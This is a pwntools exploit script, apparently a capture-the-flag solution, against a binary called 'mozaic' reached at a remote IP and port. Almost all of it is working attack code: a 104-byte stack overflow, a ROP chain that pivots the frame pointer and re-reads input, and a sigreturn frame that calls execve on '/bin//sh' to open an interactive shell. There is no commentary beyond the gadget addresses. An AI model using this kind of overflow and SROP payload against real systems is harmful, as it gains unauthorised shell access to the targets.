#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './mozaic')

host = args.HOST or '91.99.1.179'
port = int(args.PORT or 60003)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *loop+144
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

pop_rbp_ret = 0x4010d1
new_rbp = 0x4035a8
readg = 0x40125f
# 0x00000000004010cf pop rax ; pop rbx ; pop rbp ; ret
pop_rax = 0x4010cf

# 0x000000000040124d: syscall; pop rbp; ret; 
syscall = 0x40124d

frame = SigreturnFrame()
frame.rdi = 0x403000
frame.rsi = 0
frame.rdx = 0
frame.rax = 0x3b
frame.rip = syscall

read_rop = fit([
    pop_rbp_ret,
    new_rbp,
    readg,
    0 # garbage
])

frame_rop = fit([
    pop_rax,
    0xf,
    0, # garbage
    0, # garbage
    syscall,
    bytes(frame)
])


pay = fit([
    b"A" * 104,
    read_rop,
    frame_rop
])

io.clean()
io.sendline(pay)

io.clean()
io.sendline(b'q')

io.sendline(b"/bin//sh\x00")

io.interactive()

